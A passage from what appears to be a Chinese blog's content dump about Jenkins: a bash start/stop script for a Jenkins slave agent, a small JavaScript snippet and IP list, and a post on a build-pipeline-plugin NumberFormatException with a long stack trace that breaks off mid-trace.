class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">file_source</span></span>() &#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"_\">-f</span> <span class=\"variable\">$1</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">source</span> <span class=\"variable\">$1</span>;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">file_<span class=\"built_in\">source</span> /etc/profile</div><div class=\"line\">file_<span class=\"built_in\">source</span> ~/.profile</div><div class=\"line\">file_<span class=\"built_in\">source</span> ~/bash_profile</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> -z <span class=\"string\">\"<span class=\"variable\">$&#123;JAVA_HOME&#125;</span>\"</span>; <span class=\"keyword\">then</span></div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"please config JAVA_HOME~\"</span></div><div class=\"line\">  <span class=\"built_in\">exit</span> 1;</div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">BIN_PARAM=<span class=\"string\">'start'</span></div><div class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$#</span> -ge 1 ]; <span class=\"keyword\">then</span></div><div class=\"line\">  BIN_PARAM=<span class=\"variable\">$1</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">JAVA_EXE=<span class=\"variable\">$JAVA_HOME</span>/bin/java</div><div class=\"line\"></div><div class=\"line\">BIN_PATH=$( <span class=\"built_in\">cd</span> <span class=\"string\">\"<span class=\"variable\">$( dirname \"$&#123;BASH_SOURCE[0]&#125;\" )</span>\"</span> &amp;&amp; <span class=\"built_in\">pwd</span> )</div><div class=\"line\">SLAVE_CONFIG=<span class=\"variable\">$BIN_PATH</span>/slave.conf</div><div class=\"line\"><span class=\"built_in\">source</span> <span class=\"variable\">$SLAVE_CONFIG</span> </div><div class=\"line\"></div><div class=\"line\">SLAVE_HOME=$(dirname <span class=\"variable\">$BIN_PATH</span>)</div><div class=\"line\">LOG_FILE=<span class=\"variable\">$SLAVE_HOME</span>/logs/jenkins_slave.log</div><div class=\"line\"></div><div class=\"line\">SLAVE_PID_COMMAND=<span class=\"string\">\"ps -ef | grep <span class=\"variable\">$SECRET_ID</span> | grep -v grep | awk '&#123;print \\$2&#125;'\"</span></div><div class=\"line\">SLAVE_PID=$(<span class=\"built_in\">eval</span> <span class=\"variable\">$SLAVE_PID_COMMAND</span>)</div><div class=\"line\"></div><div class=\"line\">START_COMMAND=<span class=\"string\">\"nohup <span class=\"variable\">$JAVA_EXE</span> -jar <span class=\"variable\">$&#123;BIN_PATH&#125;</span>/slave.jar -jnlpUrl http://<span class=\"variable\">$&#123;SERVER_HOST&#125;</span>:<span class=\"variable\">$&#123;SERVER_PORT&#125;</span>/computer/<span class=\"variable\">$&#123;SLAVE_NAME&#125;</span>/slave-agent.jnlp -secret <span class=\"variable\">$SECRET_ID</span> 1&gt;&gt;<span class=\"variable\">$LOG_FILE</span> 2&gt;&amp;1 &amp;\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"========================================\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"java bin path: <span class=\"variable\">$JAVA_EXE</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"slave client home path: <span class=\"variable\">$SLAVE_HOME</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"slave client bin path: <span class=\"variable\">$BIN_PATH</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"load slave client conf: <span class=\"variable\">$SLAVE_CONFIG</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"========================================\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"jenkins connection params:\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - server host: <span class=\"variable\">$SERVER_HOST</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - server port: <span class=\"variable\">$SERVER_PORT</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - slave name: <span class=\"variable\">$SLAVE_NAME</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"  - secret id: <span class=\"variable\">$SECRET_ID</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"========================================\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">startup</span></span>() &#123;</div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"execute get process command: <span class=\"variable\">$SLAVE_PID_COMMAND</span>\"</span></div><div class=\"line\">  <span class=\"keyword\">if</span> [ -n <span class=\"string\">\"<span class=\"variable\">$SLAVE_PID</span>\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"process with <span class=\"variable\">$SECRET_ID</span> has existed.\"</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"jenkins slave client pid: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"execute script shell: <span class=\"variable\">$START_COMMAND</span>\"</span></div><div class=\"line\">  <span class=\"built_in\">eval</span> <span class=\"variable\">$START_COMMAND</span></div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">if</span> [ $? <span class=\"_\">-ne</span> 0 ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"fail to startup the jenkins slave client.\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 1;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">  SLAVE_PID=$(<span class=\"built_in\">eval</span> <span class=\"variable\">$SLAVE_PID_COMMAND</span>)</div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"the jenkins slave client process id: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">  <span class=\"built_in\">return</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">shutdown</span></span>() &#123;</div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"execute get process command: <span class=\"variable\">$SLAVE_PID_COMMAND</span>\"</span></div><div class=\"line\">  <span class=\"keyword\">if</span> [ -z <span class=\"string\">\"<span class=\"variable\">$SLAVE_PID</span>\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"no process with <span class=\"variable\">$SECRET_ID</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\">  </div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"killing process with pid: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">  <span class=\"built_in\">kill</span> -9 <span class=\"variable\">$SLAVE_PID</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> [ $? <span class=\"_\">-ne</span> 0 ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"fail to shutdown the jenkins slave client with pid: <span class=\"variable\">$SLAVE_PID</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 1;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"the jenkins slave client has stoped.\"</span></div><div class=\"line\">  <span class=\"built_in\">return</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">bootstrap</span></span>() &#123;</div><div class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"start\"</span> ] || [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"startup\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"startup jenkins slave client...\"</span></div><div class=\"line\">    startup</div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">elif</span> [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"stop\"</span> ] || [ <span class=\"variable\">$BIN_PARAM</span> == <span class=\"string\">\"shutdown\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"shutdown jenkins slave client...\"</span></div><div class=\"line\">    shutdown</div><div class=\"line\">    <span class=\"built_in\">exit</span> 0;</div><div class=\"line\">  <span class=\"keyword\">else</span></div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"not support param: <span class=\"variable\">$1</span>\"</span></div><div class=\"line\">    <span class=\"built_in\">exit</span> 1;</div><div class=\"line\">  <span class=\"keyword\">fi</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">bootstrap</div></pre></td></tr></table></figure>\n<h2 id=\"node节点\"><a href=\"#node节点\" class=\"headerlink\" title=\"node节点\"></a>node节点</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> links = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">\"model-link\"</span>);</div><div class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>;i&lt;links.length;i++)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">console</span>.log(links[i].innerText);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">10.10.1.11</div><div class=\"line\">10.10.1.12</div><div class=\"line\">10.10.1.13</div><div class=\"line\">10.13.2.14</div><div class=\"line\">10.13.2.15</div><div class=\"line\">10.13.2.16</div></pre></td></tr></table></figure>"},{"title":"jenkins build-pipeline-plugin 数值解析异常","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\njenkins version: 1.574\n\n## 问题分析\n这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。\n目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。\n\n**参考**：[Jenkins gives strack trace on main page](https://issues.jenkins-ci.org/browse/JENKINS-24102)\n\n<!-- more -->\n\n## 异常堆栈\n遇到的异常堆栈内容如下：\n``` java\nA problem occurred while processing the request. Please check our bug tracker to see if a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think this is a new issue, please file a new issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.\n\nStack trace\n\njavax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:117)\n\tat org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:127)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:717)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:795)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:858)\n\tat org.kohsuke.stapler.Stapler.invoke(Stapler.java:631)\n\tat org.kohsuke.stapler.Stapler.service(Stapler.java:225)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:848)\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:686)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1494)\n\tat hudson.util.PluginServletFilter$1.doFilter(PluginServletFilter.java:96)\n\tat hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:88)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:48)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:84)\n\tat hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:51)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:117)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:125)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:142)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:271)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:174)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:79)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:249)\n\tat hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:67)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:76)\n\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:164)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:46)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:81)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1474)\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:499)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:533)\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:231)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1086)\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:428)\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:193)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1020)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)\n\tat org.eclipse.jetty.server.Server.handle(Server.java:370)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:489)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:949)\n\tat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:1011)\n\tat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:644)\n\tat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)\n\tat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:668)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)\n\tat winstone.BoundedExecutorService$1.run(BoundedExecutorService.java:77)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:626)\n\tat java.lang.Thread.run(Thread.java:804)\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:44)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:81)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:63)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:53)\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:112)\n\t... 63 more\nCaused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:280)\n\tat org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:92)\n\tat com.sun.proxy.$Proxy56.projectView(Unknown Source)\n\tat lib.JenkinsTagLib$projectView.call(Unknown Source)\n\tat hudson.model.View.main.run(main.groovy:14)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:74)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:62)\n\tat org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:147)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 95 more\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:276)\n\t... 103 more\nCaused by: java.lang.NumberFormatException: null\n\tat java.lang.Integer.parseInt(Integer.java:465)\n\tat java.lang.Integer.valueOf(Integer.java:593)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:400)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:866)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:932)\n\tat hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:115)\n\tat jenkins.model.Jenkins.getViews(Jenkins.java:1444)\n\tat sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:3500)\n\tat org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:61)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:227)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy:15)\n\tat sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:66)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:141)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy)\n\tat sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat groovy.lang.Closure.call(Closure.java:415)\n\tat groovy.lang.Closure.call(Closure.java:409)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder$1.run(JellyBuilder.java:264)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat 